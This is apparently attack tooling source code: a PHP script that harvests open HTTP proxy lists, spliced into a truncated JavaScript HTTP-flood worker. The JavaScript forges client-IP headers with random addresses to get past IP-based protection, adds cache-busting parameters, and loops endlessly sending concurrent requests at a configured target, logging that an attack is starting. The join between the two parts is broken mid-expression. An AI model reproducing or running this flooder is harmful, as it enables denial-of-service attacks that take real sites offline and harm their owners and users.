<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

// REAL proxy sources (update setiap 5 menit)
$proxySources = [
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_HTTPS.txt'
];

$proxies = [];

foreach($proxySources as $source) {
    $content = @file_get_contents($source);
    if($content) {
        $lines = explode("\n", $content);
        foreach($lines as $line) {
            $line = trim($line);
            if(preg_match('/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)$/', $line, $matches)) {
                $proxies[] = $line;
            }
            if(count($proxies) > 500) break;
        }
    }
}

$proxies = array_unique($proxies);
echo json_encode(['proxies' => array_values($proxies), 'count' => count($proxies)]);
?>55)}.${Math.floor(Math.random()*255)}`,
    'X-Remote-IP': () => `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
    'X-Remote-Addr': () => `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
    'Client-IP': () => `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
    'True-Client-IP': () => `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
    'X-Client-IP': () => `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
};

async function sendRequest() {
    const url = attackConfig.target + `?rand=${Math.random()}&t=${Date.now()}&cache=${Math.random()}`;
    const headers = {
        'User-Agent': navigator.userAgent + ' ' + Math.random().toString(36),
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    };
    
    // Add all bypass headers
    for (let [key, value] of Object.entries(bypassHeaders)) {
        headers[key] = typeof value === 'function' ? value() : value;
    }
    
    try {
        const response = await fetch(url, {
            method: attackConfig.method,
            headers: headers,
            mode: 'no-cors',
            cache: 'no-store',
            credentials: 'omit',
            referrerPolicy: 'no-referrer'
        });
        return true;
    } catch(e) {
        return false;
    }
}

async function startAttack() {
    console.log('[Worker] Starting attack on', attackConfig.target);
    
    const promises = [];
    for(let i = 0; i < attackConfig.threads; i++) {
        promises.push(sendRequest());
    }
    
    while(true) {
        await Promise.all(promises);
        for(let i = 0; i < attackConfig.threads; i++) {
            sendRequest(); // Fire and forget
        }
        await new Promise(resolve => setTimeout(resolve, 1));
    }
}

// Start
startAttack();